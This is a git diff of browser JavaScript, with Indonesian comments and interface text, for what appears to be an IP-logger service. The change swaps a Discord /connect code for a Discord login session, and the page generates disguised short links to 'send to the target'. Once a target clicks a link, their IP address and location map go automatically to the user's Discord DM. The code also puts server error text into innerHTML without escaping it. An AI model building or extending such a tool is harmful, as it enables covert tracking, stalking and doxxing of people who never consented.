@@ -1,54 +1,56 @@
-let currentConnectCode = "";
+let currentSessionToken = "";
 
-// 1. Minta Kode /connect dari Serverless API
-async function getConnectCode() {
-  const display = document.getElementById('codeDisplay');
-  display.innerHTML = "<span style='color:#94a3b8; font-size: 14px;'>Membuat kode...</span>";
+// Cek Param Query Sesi di URL saat halaman dimuat
+window.addEventListener('DOMContentLoaded', () => {
+  const urlParams = new URLSearchParams(window.location.search);
+  const session = urlParams.get('session');
 
-  try {
-    const res = await fetch('/api/connect?action=generate');
-    const data = await res.json();
-
-    if (data.status === 'success') {
-      currentConnectCode = data.code;
-      display.innerHTML = `KODE: <span style="color:#38bdf8">${data.code}</span>`;
-      
-      alert(`Kode Kamu: ${data.code}\n\nBuka DM Bot Discord Kamu lalu kirim pesan:\n/connect ${data.code}`);
-    }
-  } catch (err) {
-    display.innerHTML = "<span style='color:#ef4444; font-size: 14px;'>Gagal mengambil kode</span>";
+  if (session) {
+    currentSessionToken = session;
+    localStorage.setItem('arex_session', session);
+    // Bersihkan URL dari query string agar rapi
+    window.history.replaceState({}, document.title, "/");
+  } else {
+    currentSessionToken = localStorage.getItem('arex_session') || "";
   }
-}
 
-// 2. Generate Tracking Link (arex.my.id/r/x9k2)
+  if (currentSessionToken) {
+    // Tampilkan State Dashboard jika ada sesi
+    document.getElementById('loginState').style.display = 'none';
+    document.getElementById('appState').style.display = 'block';
+  }
+});
+
 async function generateMaskedLink() {
   const target = document.getElementById('targetUrl').value.trim();
   const res = document.getElementById('resLogger');
 
-  if (!currentConnectCode) {
-    return alert('Klik "Dapatkan Kode /connect" dulu dan kirim kodenya ke DM Bot Discord Kamu!');
+  if (!currentSessionToken) {
+    return alert('Silakan Login dengan Discord terlebih dahulu!');
   }
   if (!target) {
-    return alert('Masukkan URL tujuan asli dulu (misal: youtube.com)!');
+    return alert('Masukkan URL tujuan asli (misal: youtube.com)!');
   }
 
   res.innerHTML = "<span style='color:#94a3b8;'>Membuat link tracking...</span>";
 
   try {
-    const response = await fetch(`/api/r/[id]?action=create&target=${encodeURIComponent(target)}&code=${currentConnectCode}`);
+    const response = await fetch(`/api/r/[id]?action=create&target=${encodeURIComponent(target)}&session=${currentSessionToken}`);
     const data = await response.json();
 
     if (data.status === 'success') {
       res.innerHTML = `
         <div style="color: #34d399; font-weight: bold; margin-bottom: 8px;">✅ LINK TRACKING SIAP</div>
         <div style="margin-bottom: 8px;">
-          <p style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">Salin & Kirim link ini ke target:</p>
+          <p style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">Kirim link ini ke target:</p>
           <input type="text" value="${data.shortUrl}" readonly style="width:100%; padding: 8px; background:#0f172a; border:1px solid #334155; color:#34d399; font-size:13px; border-radius:4px;" onclick="this.select()">
         </div>
         <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">
-          🔒 Menggunakan domain <b>arex.my.id</b>. Begitu diklik, IP & peta lokasi target langsung terkirim otomatis ke DM Discord kamu.
+          🔒 Begitu diklik, log IP & peta lokasi otomatis terkirim ke DM Discord kamu!
         </p>
       `;
+    } else {
+      res.innerHTML = `<span style='color:#ef4444;'>${data.error}</span>`;
     }
   } catch (err) {
     res.innerHTML = "<span style='color:#ef4444;'>Gagal membuat link tracking.</span>";
